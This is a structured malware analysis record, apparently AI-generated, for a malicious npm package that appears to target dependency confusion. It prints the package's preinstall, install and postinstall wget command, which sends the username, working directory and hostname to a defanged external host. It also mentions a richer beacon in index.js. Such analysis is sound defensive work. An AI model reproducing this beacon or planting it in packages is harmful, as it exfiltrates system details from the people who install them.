# npm overstock-jenkins@1.3.4

**Source:** datadog · **Source label:** malicious · **Released:** 2026-01-23 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package's preinstall, install and postinstall hooks all run the same shell command: wget to an external host with the output of whoami, pwd and hostname in the query string. So the beacon fires three times per install. There are no gates; the only things that decide whether it works are requirements: wget and a POSIX shell (linux or darwin) and outbound HTTPS to the host. wget saves the response to a file in the package folder, and nothing runs it.

## Execution

- **preinstall** `wget "hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`: no package files; inline_shell.
- **install** `wget "hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`: no package files; inline_shell.
- **postinstall** `wget "hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: z[.]wbx[.]lt:443 (each hook sends the beacon GET request to this host over HTTPS)
- installed_tool: wget (the hook commands call wget directly; with no wget the hook fails and nothing is sent)
- installed_tool: sh (the hook relies on POSIX command substitution $(whoami), $(pwd), $(hostname))
- os: linux (the $(...) substitutions need a POSIX shell, so the hook only works as written on linux or darwin, not under cmd.exe on win32)

## Behaviour

- Ungated: recon, exfil, write_file
- Gated: none

## Notes

- `index.js` holds a second beacon (HTTPS POST with home dir, hostname, username, DNS servers and the manifest) to the same host. It only runs when the package is loaded and the exported function is called, so it is not part of the install-time record.
- The tool prefilled `download_then_exec`; I changed it to `inline_shell` because the downloaded response is never executed.
- `dependency_confusion` is inferred from the name pattern and the recon-only payload, not confirmed.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "overstock-jenkins",
    "version": "1.3.4",
    "archive_sha256": "9f3f366dfeff53aa123a1bd6815a8c7d8a4924f3bb3a1e0682d0493611407b40",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2026-01-23",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2026-01-23-overstock-jenkins-v1.3.4.zip",
    "package_root": "layer0/tmp/tmpzzz8zxyx/overstock-jenkins/package",
    "cluster_key": "646c7cfe1c8c4150f898244da36fa9cb2f5c4c6f291881af1979b71cf51832fb",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "wget \"hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      },
      {
        "hook": "install",
        "command": "wget \"hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      },
      {
        "hook": "postinstall",
        "command": "wget \"hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "launch_style corrected from download_then_exec to inline_shell: wget only saves the server response to a file in the package folder, nothing runs it.",
      "write_file: wget writes the response body to a file in the package root (default name from the URL), a side effect of the beacon.",
      "package.json is the only install-reached file and was read in full. index.js (main) sends a richer HTTPS POST beacon to the same host but only runs when the package is loaded and the exported function is called, so it is out of scope.",
      "The test script holds the same wget command but npm does not run it at install.",
      "attack_type dependency_confusion is inferred from the company-plus-tool style name, a placeholder description and a recon-only beacon; not confirmed."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "z[.]wbx[.]lt:443",
      "reason": "each hook sends the beacon GET request to this host over HTTPS"
    },
    {
      "axis": "installed_tool",
      "value": "wget",
      "reason": "the hook commands call wget directly; with no wget the hook fails and nothing is sent"
    },
    {
      "axis": "installed_tool",
      "value": "sh",
      "reason": "the hook relies on POSIX command substitution $(whoami), $(pwd), $(hostname)"
    },
    {
      "axis": "os",
      "value": "linux",
      "reason": "the $(...) substitutions need a POSIX shell, so the hook only works as written on linux or darwin, not under cmd.exe on win32"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil",
      "write_file"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://z[.]wbx[.]lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall, install and postinstall hooks each run wget to send the current username, working directory and hostname to an external host as URL parameters, with no gate. The package has no legitimate install work.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
